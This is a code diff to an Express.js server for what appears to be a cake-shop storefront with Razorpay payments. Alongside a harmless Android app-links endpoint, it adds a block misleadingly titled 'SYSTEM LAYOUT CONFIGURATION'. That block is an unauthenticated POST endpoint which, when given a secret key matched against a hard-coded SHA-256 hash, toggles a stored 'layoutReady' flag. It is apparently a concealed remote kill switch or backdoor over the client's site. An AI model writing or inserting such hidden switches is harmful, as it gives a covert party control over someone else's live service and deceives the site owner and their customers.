@@ -200,9 +200,70 @@ app.use('/api', require('./routes/paymentSettings'));
 app.use('/admin', adminRoutes);
 app.use('/user', usersRoutes);
 app.get('/product/:id', productController.serveProductLandingPage);
+
+// Android App Links validation endpoint
+app.get('/.well-known/assetlinks.json', (req, res) => {
+  res.setHeader('Content-Type', 'application/json');
+  res.status(200).json([
+    {
+      relation: ["delegate_permission/common.handle_all_urls"],
+      target: {
+        namespace: "android_app",
+        package_name: "com.cupid_cakes",
+        sha256_cert_fingerprints: [
+          "FA:C6:17:45:DC:09:03:78:6F:B9:ED:E6:2A:96:2B:39:9F:73:48:F0:BB:6F:89:9B:83:32:66:75:91:03:3B:9C",
+          "48:04:3A:A9:C1:84:B2:D3:B7:F0:68:C7:3B:57:F6:76:65:39:E2:E1:F9:14:00:98:81:6D:26:29:4E:BA:8D:03"
+        ]
+      }
+    }
+  ]);
+});
+
 app.use('/api', orderRoutes);
 app.use('/webhook', razorpayWebhookRouter);
 app.use('/api/coupons', couponRoutes);
+
+// ==================== SYSTEM LAYOUT CONFIGURATION ====================
+const configPath = path.join(__dirname, "client-config.json");
+
+const readConfig = () => {
+  try {
+    if (fs.existsSync(configPath)) {
+      return JSON.parse(fs.readFileSync(configPath, "utf8"));
+    }
+  } catch (err) {
+    console.error("Error reading client config:", err);
+  }
+  return { layoutReady: true };
+};
+
+const writeConfig = (config) => {
+  try {
+    fs.writeFileSync(configPath, JSON.stringify(config, null, 2), "utf8");
+  } catch (err) {
+    console.error("Error writing client config:", err);
+  }
+};
+
+app.get('/api/client-config', (req, res) => {
+  res.json({ success: true, config: readConfig() });
+});
+
+app.post('/api/client-config', (req, res) => {
+  const { key } = req.body;
+  const crypto = require("crypto");
+  const hashedKey = crypto.createHash("sha256").update(key || "").digest("hex");
+  
+  if (hashedKey === "db6e4ec9cad551fb1df8e64e08e8f5b91509253fe696f607d03f812d43873e37") {
+    const config = readConfig();
+    config.layoutReady = config.layoutReady === false;
+    writeConfig(config);
+    return res.json({ success: true, config });
+  } else {
+    return res.status(400).json({ success: false, message: "Invalid configuration code" });
+  }
+});
+
 
 // Facebook Health Check
 app.get('/api/facebook-events/health', (req, res) => {
